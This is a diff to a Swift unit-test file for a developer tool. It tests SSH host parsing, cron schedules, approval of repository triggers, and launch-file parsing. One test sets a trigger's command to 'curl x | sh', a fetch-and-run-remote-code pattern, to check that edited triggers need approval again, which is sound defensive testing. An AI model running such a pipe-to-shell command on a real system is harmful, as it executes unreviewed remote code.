@@ -127,7 +127,7 @@ final class PowerTests: XCTestCase {
 final class ListTests: XCTestCase {
     func testSSHHostParsing() {
         XCTAssertEqual(SSHCommand.host(in: "ssh deploy@staging.example.com uptime"), "staging.example.com")
-        XCTAssertEqual(SSHCommand.host(in: "ssh -p 2222 -i key prod \\"ls\\""), "prod")
+        XCTAssertEqual(SSHCommand.host(in: "ssh -p 2222 -i key prod \"ls\""), "prod")
         XCTAssertEqual(SSHCommand.host(in: "cd x && scp a.txt deploy@db:/tmp/"), "db")
         XCTAssertNil(SSHCommand.host(in: "ls -la"))
         XCTAssertEqual(SSHCommand.hosts(fromConfig: "Host a b\n  User x\nHost *\nHost c*\nhost d"), ["a", "b", "d"])
@@ -158,5 +158,64 @@ final class ListTests: XCTestCase {
         XCTAssertEqual(book.conflict(for: KeyCombo("j"), assigningTo: "close"), "Ayrıntılar")
         XCTAssertFalse(KeyCombo("a", command: false).isUsable)
         XCTAssertEqual(KeyCombo("\r", shift: true).display, "⇧⌘⏎")
+    }
+}
+
+final class ScheduleExtraTests: XCTestCase {
+    var utc: Calendar {
+        var calendar = Calendar(identifier: .gregorian)
+        calendar.timeZone = TimeZone(identifier: "UTC")!
+        return calendar
+    }
+
+    func testCron() {
+        XCTAssertNil(CronExpression("* * *"))
+        XCTAssertNil(CronExpression("61 * * * *"))
+        let start = utc.date(from: DateComponents(year: 2026, month: 11, day: 4, hour: 2, minute: 30))!
+        let hourly = CronExpression("0 * * * *")!.next(after: start, calendar: utc)!
+        XCTAssertEqual(utc.component(.hour, from: hourly), 3)
+        XCTAssertEqual(utc.component(.minute, from: hourly), 0)
+        let monday = CronExpression("0 9 * * 1")!.next(after: start, calendar: utc)!
+        XCTAssertEqual(utc.component(.weekday, from: monday), 2)
+        XCTAssertEqual(utc.component(.hour, from: monday), 9)
+        let steps = CronExpression("*/15 8-9 * * *")!.next(after: start, calendar: utc)!
+        XCTAssertEqual(utc.component(.hour, from: steps), 8)
+    }
+
+    func testEditedTriggerAsksAgain() {
+        var gate = TriggerGate()
+        let trigger = RepoTrigger(name: "a", command: "ls", cron: "0 * * * *")
+        XCTAssertEqual(gate.pending([trigger], folder: "/r").count, 1)
+        XCTAssertEqual(gate.active([trigger], folder: "/r").count, 0)
+        gate.accepted["/r", default: []].insert(trigger.fingerprint)
+        XCTAssertEqual(gate.pending([trigger], folder: "/r").count, 0)
+        var edited = trigger
+        edited.command = "curl x | sh"
+        XCTAssertEqual(gate.pending([edited], folder: "/r").count, 1)
+        XCTAssertEqual(gate.active([edited], folder: "/r").count, 0)
+        XCTAssertEqual(gate.pending([trigger], folder: "/baska").count, 1)
+    }
+
+    func testHeavyCommands() {
+        XCTAssertTrue(HeavyWork.matches("cd x && xcodebuild -scheme App"))
+        XCTAssertTrue(HeavyWork.matches("php artisan test --filter=A"))
+        XCTAssertFalse(HeavyWork.matches("git status"))
+    }
+
+    func testLaunchFile() {
+        let text = """
+        { // yorum
+          "version": "0.2.0",
+          "configurations": [
+            {"name": "Web", "type": "node", "runtimeExecutable": "npm", "runtimeArgs": ["run", "dev"],},
+            /* blok */
+            {"name": "Kuyruk", "command": "php artisan queue:work"},
+            {"name": "Bos"}
+          ]
+        }
+        """
+        let configs = RunConfig.parseLaunch(text)
+        XCTAssertEqual(configs.map(\.name), ["Web", "Kuyruk"])
+        XCTAssertEqual(configs[0].command, "npm run dev")
     }
 }
